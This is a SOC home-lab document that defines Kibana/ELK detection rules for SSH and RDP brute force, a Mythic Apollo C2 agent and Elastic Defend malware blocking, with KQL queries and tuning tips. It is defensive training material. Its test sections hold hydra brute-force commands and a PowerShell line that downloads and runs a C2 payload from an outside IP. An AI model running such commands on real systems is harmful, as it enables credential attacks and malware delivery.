# Detection Rules - ELK SIEM SOC Lab

This document contains all 4 detection rules used in this lab.

---

## Rule 1: SSH Brute Force Detection

### Overview
Detects multiple failed SSH login attempts on Linux servers.

### Rule Details

| Property | Value |
|----------|-------|
| Name | `ssh bruteforce attempt ubuntu` |
| Severity | Medium |
| Risk Score | 47 |
| Rule Type | Threshold |
| Schedule | Every 1 minute |
| Look-back | 1 minute |

### KQL Query
```kql
system.auth.ssh.event: failed and agent.name: ip-172-31-3-64 and user.name: "ubuntu" and system.auth.ssh.event: Failed
```

### Query Explanation
- `system.auth.ssh.event: failed` - Look for failed SSH events
- `agent.name: ip-172-31-3-64` - From specific Ubuntu agent (replace with your agent name)
- `user.name: "ubuntu"` - Target user is "ubuntu"
- `system.auth.ssh.event: Failed` - Event type is failed authentication

### Threshold Settings
```
Threshold: > 5
Time window: 1 minute
Group by: source.ip, user.name
```

**Meaning**: Alert if more than 5 failed SSH attempts from same IP in 1 minute

### Actions
- Create alert in Kibana
- Send webhook to osTicket (auto-create ticket)

### How to Test
```bash
# From attacker machine (Kali Linux)
hydra -l ubuntu -P /tmp/wordlist.txt -t 4 ssh://TARGET-LINUX-IP

# Or manual failed attempts:
ssh ubuntu@TARGET-LINUX-IP
(enter wrong password 6 times)
```

### Expected Result
- Alert triggers in Kibana after 5 failures
- osTicket ticket created automatically
- Subject: "ssh bruteforce attempt ubuntu"

---

## Rule 2: RDP Brute Force Detection

### Overview
Detects multiple failed RDP login attempts on Windows servers.

### Rule Details

| Property | Value |
|----------|-------|
| Name | `rdp bruteforce attempt administrator` |
| Severity | Medium |
| Risk Score | 47 |
| Rule Type | Threshold |
| Schedule | Every 1 minute |
| Look-back | 1 minute |

### KQL Query
```kql
event.code: 4625 and winlog.event_data.TargetUserName: Administrator and winlog.event_data.FailureReason: "*logon failure*"
```

### Query Explanation
- `event.code: 4625` - Windows failed logon event code
- `winlog.event_data.TargetUserName: Administrator` - Target is Administrator user
- `winlog.event_data.FailureReason: "*logon failure*"` - Reason contains "logon failure"

### Threshold Settings
```
Threshold: > 5
Time window: 1 minute
Group by: source.ip, user.name
```

### Actions
- Create alert in Kibana
- Send webhook to osTicket (auto-create ticket)

### How to Test
```bash
# From attacker machine
hydra -l Administrator -P /tmp/wordlist.txt -t 4 rdp://TARGET-WINDOWS-IP

# Or using xfreerdp (failed attempts):
xfreerdp /u:Administrator /p:wrongpassword /v:TARGET-WINDOWS-IP
(repeat with different passwords)
```

### Expected Result
- Alert triggers after 5 failures
- osTicket ticket created with subject: "rdp bruteforce attempt administrator"
- Can correlate with SSH attacks

---

## Rule 3: C2 Malware Detection (Apollo Agent)

### Overview
Detects execution of Mythic C2 Apollo agent on Windows systems.

### Rule Details

| Property | Value |
|----------|-------|
| Name | `apollo c2 detection` |
| Severity | Critical |
| Risk Score | 99 |
| Rule Type | Query match |
| Schedule | Every 1 minute |
| Look-back | 1 minute |

### KQL Query
```kql
event.code: 1 and (winlog.event_data.Hashes: *73C4918E5994427685F466E45176F1FE3FFB79DA7840A21775A43DFFC447CBE7* or winlog.event_data.OriginalFileName: Apollo.exe)
```

### Query Explanation
- `event.code: 1` - Process creation event (Sysmon)
- `winlog.event_data.Hashes: *73C4918E...CBE7*` - File hash of zoro.exe
- `winlog.event_data.OriginalFileName: Apollo.exe` - Original name is Apollo.exe
- Uses OR condition - matches either hash OR filename

### Fields Captured
```
- @timestamp: When it ran
- host.name: Which computer
- winlog.event_data.Image: Full path (C:\Users\Public\Downloads\zoro.exe)
- winlog.event_data.CommandLine: Command arguments
- winlog.event_data.ParentImage: Parent process
- user.name: User who ran it
- process.pid: Process ID
```

### Actions
- Create Critical severity alert
- Send to osTicket with full context
- Trigger Elastic Defend to isolate host

### How to Test
```powershell
# On Windows victim, download and execute
Invoke-WebRequest -Uri http://13.61.205.240:9999/zoro.exe -OutFile "C:\Users\Public\Downloads\zoro.exe"
.\zoro.exe

# Wait 10-15 seconds for callback to Mythic C2
```

### Expected Result
- Alert triggers immediately (Critical)
- Shows process execution details
- osTicket ticket created with C2 alert
- Elastic Defend blocks file execution
- Network connection to C2 server detected (Event 3)

---

## Rule 4: Malware Detection (Elastic Defend)

### Overview
Detects and blocks malware files using Elastic Defend endpoint protection.

### Rule Details

| Property | Value |
|----------|-------|
| Name | `malware detected - host isolation` |
| Severity | Critical |
| Risk Score | 99 |
| Rule Type | Endpoint event |
| Trigger | File flagged as malware |

### Detection Logic
Elastic Defend analyzes files in real-time:
- File hash against malware databases
- Behavior analysis (suspicious APIs, permissions)
- Machine learning models
- Sandboxing (if configured)

### Files Detected
- `zoro.exe` - Flagged as "Malware"
- Blocked from execution automatically
- Quarantined by Elastic Defend

### Actions
- Auto-block file execution
- Isolate host from network
- Generate critical alert
- Create osTicket ticket

### Host Isolation Details
```
When alert triggers:
1. Network rules applied
2. Inbound traffic blocked
3. Outbound traffic blocked
4. SSH/RDP connections severed
5. Investigation mode enabled
```

### Recovery Steps
```
In Kibana:
1. Security → Endpoints
2. Click affected host
3. Actions → Respond → Release host isolation
4. Wait 30 seconds for policy sync
```

### How to Test
```powershell
# On Windows (same as C2 test above)
.\zoro.exe

# Observe:
# - File blocked immediately
# - Alert in Elastic Security
# - RDP disconnection (host isolation)
# - osTicket ticket created
```

### Expected Result
- Alert: "Malware Prevention Alert"
- File: zoro.exe blocked
- Host: Isolated (no network access)
- osTicket: Auto-created ticket
- Investigation window: Ready for analysis

---

## Creating New Rules in Kibana

### Step-by-Step

1. **Go to Security → Rules**
2. **Click "Create new rule"**
3. **Choose Rule Type**:
   - Custom query (KQL)
   - Machine learning
   - Threshold
   - Event correlation

4. **Enter Query**:
   ```kql
   event.code: 1 and process.name: suspicious.exe
   ```

5. **Set Severity**:
   - Critical (Critical threat)
   - High (Confirmed attack)
   - Medium (Suspicious)
   - Low (Informational)

6. **Configure Schedule**:
   ```
   Runs every: 1 minute
   Additional look-back: 1 minute
   ```

7. **Add Actions**:
   - Select osTicket connector
   - Set webhook body (see README.md)

8. **Save & Enable**

---

## KQL Query Cheat Sheet

### Common Patterns

**Process Execution**:
```kql
event.code: 1 and process.name: powershell.exe
```

**Network Connections**:
```kql
event.code: 3 and destination.ip: 192.168.1.100
```

**Failed Authentication**:
```kql
event.code: 4625 and winlog.event_data.FailureReason: *
```

**File Activity**:
```kql
event.code: 11 and file.path: C:\\Windows\\*
```

**Registry Changes**:
```kql
event.code: 13 and registry.path: *Run*
```

**Time Range**:
```kql
@timestamp: [now-1h TO now]
```

**Grouping & Aggregation**:
```kql
event.code: 4625 | stats count() by source.ip
```

---

## Rule Testing Checklist

Before enabling a rule:

- [ ] Query returns expected results in Discover
- [ ] Threshold is appropriate (not too sensitive)
- [ ] Fields are correctly mapped
- [ ] Time window is suitable
- [ ] Action/connector is configured
- [ ] No false positives in test
- [ ] Severity level matches impact

---

## Rule Performance Tips

### Fast Rules (execute in seconds)
- Simple field matches
- Small time windows
- Specific field values

### Slow Rules (execute in minutes)
- Complex queries
- Large time windows (7 days+)
- Aggregations & grouping
- Multiple conditions

### Optimization Tips
1. Use specific field names (not wildcards)
2. Add date filters to limit dataset
3. Use negative queries sparingly
4. Group rules by similarity
5. Archive old rules

---

## Troubleshooting Rules

### Rule not triggering?

1. **Check if logs exist**:
   ```kql
   # Run query in Discover
   event.code: 1  # Should return results
   ```

2. **Verify schedule**:
   - Rules → Edit rule → Check "Runs every"
   - Minimum 1 minute

3. **Check lookback**:
   - Make sure "Additional look-back" is sufficient

4. **Review threshold**:
   - Threshold might be too high

5. **Check action**:
   - osTicket connector working?
   - Test connector in Management → Connectors

### Rule triggering too often (false positives)?

1. **Increase threshold**:
   - If set to > 1, try > 5

2. **Narrow query**:
   - Add more specific conditions
   - Exclude known good traffic

3. **Increase time window**:
   - Change from 1 min to 5 min

4. **Add exclusions**:
   - Exclude internal IPs
   - Exclude service accounts

---

## Advanced: Rule Correlations

For future: You can correlate multiple rules:

```kql
# Alert if BOTH SSH brute force AND successful login occur
ssh_failed_count > 5 AND ssh_success_count > 0 within 5m
```

This detects when brute force succeeds.

---

## References

- [Kibana KQL Documentation](https://www.elastic.co/guide/en/kibana/current/kuery-query.html)
- [Elastic Detection Rules](https://github.com/elastic/detection-rules)
- [Sysmon Event Codes](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [Windows Event IDs](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/)
